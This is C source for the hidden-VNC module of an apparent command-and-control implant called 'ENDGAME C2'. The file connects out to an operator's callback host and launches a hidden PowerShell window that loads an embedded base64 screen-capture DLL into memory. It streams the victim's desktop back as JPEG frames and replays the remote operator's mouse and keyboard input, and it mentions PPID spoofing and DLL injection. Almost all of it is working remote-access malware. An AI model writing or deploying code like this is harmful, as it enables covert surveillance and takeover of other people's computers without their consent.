/*
 * vnc.c — ENDGAME C2 VNC module (C agent)
 *
 * Uses PowerShell CopyFromScreen for capture (same approach as SCREENSHOT command).
 * PS subprocess outputs "W,H,base64JPEG\n" in a loop; this relay thread reads it
 * and sends standard VNC FRAME messages to the C2 TCP callback port.
 *
 * DLL injection is handled by the Go agent (vnc_dll_inject_windows.go).
 * The C agent supports the PS-based path only.
 */

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include "vnc.h"

/* ── Protocol constants ───────────────────────────────────────────────────── */
#define VNC_FRAME        0x01
#define VNC_INFO         0x02
#define VNC_PONG         0x03
#define VNC_MOUSE_MOVE   0x10
#define VNC_MOUSE_CLICK  0x11
#define VNC_MOUSE_WHEEL  0x12
#define VNC_KEY          0x13
#define VNC_STOP         0x14
#define VNC_PING         0x15

/* MOUSEEVENTF_VIRTUALDESK not always defined in lean Windows headers */
#ifndef MOUSEEVENTF_VIRTUALDESK
#define MOUSEEVENTF_VIRTUALDESK 0x4000
#endif

/* ── Session state ────────────────────────────────────────────────────────── */
static volatile LONG g_vnc_running = 0;
static HANDLE        g_stop_event  = NULL;

/* ── Wire helpers ─────────────────────────────────────────────────────────── */

static BOOL tcp_write_all(SOCKET s, const void *buf, int n) {
    const char *p = (const char *)buf;
    while (n > 0) {
        int r = send(s, p, n, 0);
        if (r <= 0) return FALSE;
        p += r; n -= r;
    }
    return TRUE;
}

static BOOL tcp_read_all(SOCKET s, void *buf, int n) {
    char *p = (char *)buf;
    while (n > 0) {
        int r = recv(s, p, n, 0);
        if (r <= 0) return FALSE;
        p += r; n -= r;
    }
    return TRUE;
}

static BOOL tcp_send_frame(SOCKET s, uint8_t type, const void *payload, uint32_t plen) {
    uint8_t hdr[5];
    hdr[0] = type;
    hdr[1] = (uint8_t)(plen & 0xFF);
    hdr[2] = (uint8_t)((plen >> 8) & 0xFF);
    hdr[3] = (uint8_t)((plen >> 16) & 0xFF);
    hdr[4] = (uint8_t)((plen >> 24) & 0xFF);
    if (!tcp_write_all(s, hdr, 5)) return FALSE;
    if (plen > 0) tcp_write_all(s, payload, (int)plen);
    return TRUE;
}

/* ── Base64 decode (minimal, for PS output) ───────────────────────────────── */

static const int8_t b64_dtab[256] = {
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
    52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-2,-1,-1,
    -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
    15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
    -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
    41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
};

static size_t b64_decode(const char *src, size_t srclen, uint8_t *dst) {
    size_t out = 0;
    uint32_t acc = 0; int bits = 0;
    for (size_t i = 0; i < srclen; i++) {
        uint8_t c = (uint8_t)src[i];
        int8_t v = b64_dtab[c];
        if (v < 0) continue;
        acc = (acc << 6) | (uint32_t)v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            dst[out++] = (uint8_t)((acc >> bits) & 0xFF);
        }
    }
    return out;
}

/* ── Input injection ─────────────────────────────────────────────────────── */

static void vnc_handle_input(uint8_t type, const uint8_t *p, uint32_t plen) {
    int sw = GetSystemMetrics(78 /*SM_CXVIRTUALSCREEN*/);
    int sh = GetSystemMetrics(79 /*SM_CYVIRTUALSCREEN*/);
    if (sw <= 0) { sw = GetSystemMetrics(SM_CXSCREEN); sh = GetSystemMetrics(SM_CYSCREEN); }
    if (sw <= 0) { sw = 1920; sh = 1080; }

    if (type == VNC_MOUSE_MOVE) {
        if (plen < 8 || !p) return;
        uint32_t x, y;
        memcpy(&x, p,   4);
        memcpy(&y, p+4, 4);
        INPUT inp = {0};
        inp.type = INPUT_MOUSE;
        inp.mi.dx      = (LONG)(65535 * (int)x / sw);
        inp.mi.dy      = (LONG)(65535 * (int)y / sh);
        inp.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;
        SendInput(1, &inp, sizeof(INPUT));

    } else if (type == VNC_MOUSE_CLICK) {
        if (plen < 10 || !p) return;
        uint32_t x, y;
        memcpy(&x, p,   4);
        memcpy(&y, p+4, 4);
        uint8_t btn = p[8], down = p[9];
        LONG nx = (LONG)(65535 * (int)x / sw);
        LONG ny = (LONG)(65535 * (int)y / sh);
        DWORD flags = 0;
        if      (btn == 1) flags = down ? MOUSEEVENTF_LEFTDOWN   : MOUSEEVENTF_LEFTUP;
        else if (btn == 2) flags = down ? MOUSEEVENTF_RIGHTDOWN  : MOUSEEVENTF_RIGHTUP;
        else if (btn == 3) flags = down ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP;
        if (flags) {
            INPUT inputs[2] = {{0},{0}};
            inputs[0].type       = INPUT_MOUSE;
            inputs[0].mi.dx      = nx; inputs[0].mi.dy = ny;
            inputs[0].mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;
            inputs[1].type       = INPUT_MOUSE;
            inputs[1].mi.dx      = nx; inputs[1].mi.dy = ny;
            inputs[1].mi.dwFlags = MOUSEEVENTF_ABSOLUTE | flags | MOUSEEVENTF_VIRTUALDESK;
            SendInput(2, inputs, sizeof(INPUT));
        }

    } else if (type == VNC_MOUSE_WHEEL) {
        if (plen < 4 || !p) return;
        int32_t delta;
        memcpy(&delta, p, 4);
        INPUT inp = {0};
        inp.type           = INPUT_MOUSE;
        inp.mi.mouseData   = (DWORD)delta;
        inp.mi.dwFlags     = MOUSEEVENTF_WHEEL;
        SendInput(1, &inp, sizeof(INPUT));

    } else if (type == VNC_KEY) {
        if (plen < 3 || !p) return;
        WORD vk = (WORD)((uint16_t)p[0] | ((uint16_t)p[1] << 8));
        INPUT inp = {0};
        inp.type          = INPUT_KEYBOARD;
        inp.ki.wVk        = vk;
        inp.ki.dwFlags    = p[2] ? 0 : KEYEVENTF_KEYUP;
        SendInput(1, &inp, sizeof(INPUT));
    }
}

/* ── VNC PS session thread ────────────────────────────────────────────────── */

typedef struct {
    SOCKET sock;
    int    quality;
} VNCPsArgs;

/* Input reader: server→agent TCP, handles STOP/PING/mouse/key */
static DWORD WINAPI vnc_input_reader(LPVOID param) {
    SOCKET sock = *(SOCKET *)param;
    while (WaitForSingleObject(g_stop_event, 0) == WAIT_TIMEOUT) {
        uint8_t hdr[5];
        if (!tcp_read_all(sock, hdr, 5)) break;
        uint8_t  type = hdr[0];
        uint32_t plen = (uint32_t)hdr[1] | ((uint32_t)hdr[2]<<8)
                       | ((uint32_t)hdr[3]<<16) | ((uint32_t)hdr[4]<<24);
        uint8_t *payload = NULL;
        if (plen > 0 && plen <= 65536) {
            payload = (uint8_t *)malloc(plen);
            if (!payload || !tcp_read_all(sock, payload, (int)plen)) {
                free(payload); break;
            }
        } else if (plen > 65536) {
            break;
        }
        if (type == VNC_STOP) {
            SetEvent(g_stop_event); free(payload); break;
        } else if (type == VNC_PING) {
            tcp_send_frame(sock, VNC_PONG, NULL, 0);
        } else {
            vnc_handle_input(type, payload, plen);
        }
        free(payload);
    }
    return 0;
}

static const char cap_dll_b64[] = "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bABsAAAAAAAkAAIAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAACAAAAAoAAIAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAACANQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";

static DWORD WINAPI vnc_ps_thread(LPVOID param) {
    VNCPsArgs *a = (VNCPsArgs *)param;

    /* PowerShell capture loop â outputs W,H,base64JPEG\n */
    char *ps_cmd = malloc(6144);
    snprintf(ps_cmd, 6144,
        "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command "
        "\"$q=%d;"
        "Add-Type -AssemblyName System.Drawing;"
        "$d=[Convert]::FromBase64String('%s');"
        "$a=[Reflection.Assembly]::Load($d);"
        "$SC=$a.GetType('SC');"
        "while($true){"
        "try{"
        "$bmp=$SC.GetMethod('Cap').Invoke($null,$null);"
        "$ms=[IO.MemoryStream]::new();"
        "$ec=[Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|Where-Object{$_.MimeType-eq'image/jpeg'};"
        "$ep=[Drawing.Imaging.EncoderParameters]::new(1);"
        "$ep.Param[0]=[Drawing.Imaging.EncoderParameter]::new([Drawing.Imaging.Encoder]::Quality,[long]$q);"
        "$bmp.Save($ms,$ec,$ep);"
        "$w=$bmp.Width;$h=$bmp.Height;$b=[Convert]::ToBase64String($ms.ToArray());"
        "[Console]::Out.WriteLine($w.ToString()+','+$h.ToString()+','+$b);"
        "$bmp.Dispose();$ms.Dispose()"
        "}catch{};"
        "Start-Sleep -Milliseconds 66}\"",
        a->quality, cap_dll_b64);

    SECURITY_ATTRIBUTES sa_pipe = { sizeof(sa_pipe), NULL, TRUE };
    HANDLE hRead = NULL, hWrite = NULL;
    if (!CreatePipe(&hRead, &hWrite, &sa_pipe, 0)) goto done;

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(NULL, ps_cmd, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite);
        free(ps_cmd);
        goto done;
    }
    CloseHandle(hWrite);
    CloseHandle(pi.hThread);
    free(ps_cmd);

    /* Spawn input reader */
    SOCKET *sockptr = &a->sock;
    HANDLE hInput = CreateThread(NULL, 0, vnc_input_reader, sockptr, 0, NULL);

    BOOL sent_info = FALSE;
    static char line_buf[8*1024*1024];
    DWORD total = 0;

    while (WaitForSingleObject(g_stop_event, 0) == WAIT_TIMEOUT) {
        DWORD avail = 0;
        if (!PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL)) break;
        if (avail == 0) { Sleep(10); continue; }

        DWORD nr = 0;
        DWORD to_read = min(avail, (DWORD)(sizeof(line_buf) - total - 1));
        if (!ReadFile(hRead, line_buf + total, to_read, &nr, NULL) || nr == 0) break;
        total += nr;
        line_buf[total] = 0;

        char *nl = strchr(line_buf, '\n');
        if (!nl) {
            if (total >= sizeof(line_buf) - 2) total = 0;
            continue;
        }
        *nl = 0;
        char *line = line_buf;

        /* Strip leading/trailing whitespace */
        while (*line == '\r' || *line == ' ') line++;

        char *p1 = strchr(line, ',');
        if (!p1) goto next_line;
        char *p2 = strchr(p1+1, ',');
        if (!p2) goto next_line;

        int w = atoi(line);
        int h = atoi(p1+1);
        const char *b64 = p2+1;
        size_t b64len = strlen(b64);
        while (b64len > 0 && (b64[b64len-1]=='\r'||b64[b64len-1]=='\n'||b64[b64len-1]==' '))
            b64len--;

        size_t max_dec = b64len * 3 / 4 + 4;
        uint8_t *dec = (uint8_t *)malloc(max_dec);
        if (!dec) goto next_line;
        size_t dec_len = b64_decode(b64, b64len, dec);

        if (dec_len > 0) {
            if (!sent_info) {
                char info[128];
                int ilen = snprintf(info, sizeof(info), "{\"w\":%d,\"h\":%d}", w, h);
                tcp_send_frame(a->sock, VNC_INFO, info, (uint32_t)ilen);
                sent_info = TRUE;
            }
            /* FRAME: [2B w LE][2B h LE][JPEG] */
            size_t flen = 4 + dec_len;
            uint8_t *frame = (uint8_t *)malloc(flen);
            if (frame) {
                frame[0] = (uint8_t)(w & 0xFF);  frame[1] = (uint8_t)((w>>8)&0xFF);
                frame[2] = (uint8_t)(h & 0xFF);  frame[3] = (uint8_t)((h>>8)&0xFF);
                memcpy(frame+4, dec, dec_len);
                tcp_send_frame(a->sock, VNC_FRAME, frame, (uint32_t)flen);
                free(frame);
            }
        }
        free(dec);

    next_line:;
        size_t consumed = (size_t)(nl - line_buf) + 1;
        memmove(line_buf, nl+1, total - consumed);
        total -= (DWORD)consumed;
    }

    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(hRead);
    if (hInput) { WaitForSingleObject(hInput, 2000); CloseHandle(hInput); }

done:
    closesocket(a->sock);
    free(a);
    InterlockedExchange(&g_vnc_running, 0);
    return 0;
}

/* ── Public API ─────────────────────────────────────────────────────────── */

void vnc_start_ps(const char *callback_host, int callback_port,
                  int quality, DWORD ppid_spoof) {
    (void)ppid_spoof;
    if (InterlockedCompareExchange(&g_vnc_running, 1, 0) != 0)
        return; /* already running */

    WSADATA wsd; WSAStartup(MAKEWORD(2,2), &wsd);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        InterlockedExchange(&g_vnc_running, 0); return;
    }
    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port = htons((u_short)callback_port);
    sa.sin_addr.s_addr = inet_addr(callback_host);
    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        closesocket(sock);
        InterlockedExchange(&g_vnc_running, 0); return;
    }

    if (g_stop_event) { CloseHandle(g_stop_event); g_stop_event = NULL; }
    g_stop_event = CreateEventA(NULL, TRUE, FALSE, NULL);

    VNCPsArgs *args = (VNCPsArgs *)malloc(sizeof(VNCPsArgs));
    args->sock    = sock;
    args->quality = quality;

    HANDLE ht = CreateThread(NULL, 0, vnc_ps_thread, args, 0, NULL);
    if (!ht) {
        closesocket(sock); free(args);
        InterlockedExchange(&g_vnc_running, 0);
    } else {
        CloseHandle(ht);
    }
}

/* DLL injection path — not implemented in C agent; use Go agent. */
void vnc_start_dll(const char *callback_host, int callback_port,
                   int quality, DWORD target_pid) {
    (void)target_pid;
    /* Fall through to PS path */
    vnc_start_ps(callback_host, callback_port, quality, 0);
}

void vnc_stop(void) {
    if (g_stop_event) SetEvent(g_stop_event);
}

#endif /* _WIN32 */
